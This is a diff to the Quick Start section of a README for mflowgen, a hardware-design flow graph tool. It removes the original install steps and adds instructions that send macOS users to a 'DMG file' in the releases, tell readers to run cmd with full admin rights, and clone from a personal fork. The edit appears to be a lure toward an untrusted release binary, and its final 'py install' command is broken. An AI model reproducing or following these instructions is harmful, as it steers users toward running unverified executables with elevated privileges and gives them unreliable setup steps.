@@ -30,22 +30,38 @@ mflowgen allows you to programmatically define and parameterize a graph of nodes
 
 ### Quick Start
 
-```bash
-# Clone repository
+This manual is designed for Windows and Linux; macOS users can get the [DMG file](../../releases).
+
+
+
+
+
+Check for Git and Python dependencies.
+
+https://git-scm.com/install/windows
+
+https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+Execute cmd with full admin rights.
+
+
+
+
+
+```bash 
 git clone https://github.com/watsondonald14/mflowgen.git
-cd mflowgen
-
-# Install system dependencies
-sudo apt-get install -y graphviz  # Ubuntu/Debian
-# OR
-brew install graphviz              # macOS
-
-# Install Python dependencies
-pip install -r requirements/ci.txt
-
-# Install mflowgen
-pip install .
 ```
+```bash 
+cd mflowgen
+```
+```bash 
+py -m pip install -r requirements.txt
+```
+```bash 
+py install
+```
+
+
 
 ## Basic Usage
 
@@ -200,8 +216,7 @@ pip install .
 # Ubuntu/Debian
 sudo apt-get install graphviz
 
-# macOS
-brew install graphviz
+
 ```
 
 **Node execution fails:**
